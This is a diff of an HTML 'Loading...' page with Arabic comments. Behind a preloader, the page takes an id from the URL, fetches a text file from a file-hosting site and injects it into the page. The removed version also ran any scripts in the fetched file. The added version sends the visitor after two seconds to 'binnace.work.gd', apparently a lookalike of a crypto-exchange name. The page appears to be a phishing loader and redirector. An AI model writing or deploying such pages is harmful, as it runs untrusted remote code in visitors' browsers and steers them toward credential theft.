@@ -1,95 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-    <style>
-        body {
-            background-color: #fff;
-        }
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <style>
+    body {
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+    }
 
-        #preloader {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #fefcfe;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
+    #preloader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #fefcfe;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
 
-        #preloader img {
-            width: 48px;
-        }
+    #preloader img {
+      width: 48px;
+    }
 
-        @media (min-width: 768px) {
-            #preloader img {
-                width: 55px;
-            }
-        }
-    </style>
+    @media (min-width: 768px) {
+      #preloader img {
+        width: 55px;
+      }
+    }
+  </style>
 </head>
 <body>
-
-<div id="preloader">
+  <div id="preloader">
     <img src="Loading.gif" alt="Loading..." />
-</div>
+  </div>
 
-<div id="content" style="display:none;"></div>
+  <div id="content"></div>
 
-<script>
-function err() {
-    document.getElementById("content").innerHTML = "<h2>المحتوى غير متاح أو فيه خطأ.</h2>";
-    document.getElementById("preloader").style.display = "none";
-    document.getElementById("content").style.display = "block";
-}
-
-window.addEventListener("load", function () {
-    var i = new URLSearchParams(window.location.search).get('i');
-    if (i) {
-        fetch("https://files.catbox.moe/" + i + ".txt")
-            .then(res => {
-                if (!res.ok) throw new Error("File not found");
-                return res.text();
-            })
-            .then(code => {
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(code, 'text/html');
-
-                // نضيف styles و links فالرأس
-                doc.querySelectorAll("style, link[rel='stylesheet']").forEach(tag => {
-                    document.head.appendChild(tag.cloneNode(true));
-                });
-
-                // نحط المحتوى
-                const content = doc.body;
-                content.childNodes.forEach(node => {
-                    if (node.tagName === 'SCRIPT') {
-                        const newScript = document.createElement('script');
-                        newScript.text = node.textContent;
-                        document.body.appendChild(newScript);
-                    } else {
-                        document.getElementById("content").appendChild(node.cloneNode(true));
-                    }
-                });
-
-                // نخبي preloader
-                document.getElementById("preloader").style.display = "none";
-                document.getElementById("content").style.display = "block";
-            })
-            .catch(error => {
-                err();
-            });
-    } else {
-        err();
+  <script>
+    function err() {
+      document.getElementById('preloader').style.display = 'none';
+      document.getElementById('content').innerHTML = "<p style='text-align:center;'>ID غير صالح أو وقع خطأ!</p>";
+      home();
     }
-});
-</script>
 
+    function home() {
+      // هنا دير شنو بغيتي يوقع إلا كان id غير صالح
+      console.log("Invalid ID or failed to fetch file.");
+    }
 
+    window.addEventListener("load", function () {
+      var i = new URLSearchParams(window.location.search).get('i');
+      if (i) {
+        fetch("https://files.catbox.moe/" + i + ".txt")
+          .then(res => {
+            if (!res.ok) throw new Error("Network response was not ok");
+            return res.text();
+          })
+          .then(code => {
+            document.getElementById('preloader').style.display = 'none';
+            document.getElementById('content').innerHTML = code;
 
+            // تحويل تلقائي بعد 2 ثواني
+            setTimeout(function () {
+              location.href = "https://binnace.work.gd/?i=2gt7rp";
+            }, 2000);
+          })
+          .catch(error => {
+            console.error(error);
+            err();
+          });
+      } else {
+        err();
+      }
+    });
+  </script>
 </body>
 </html>
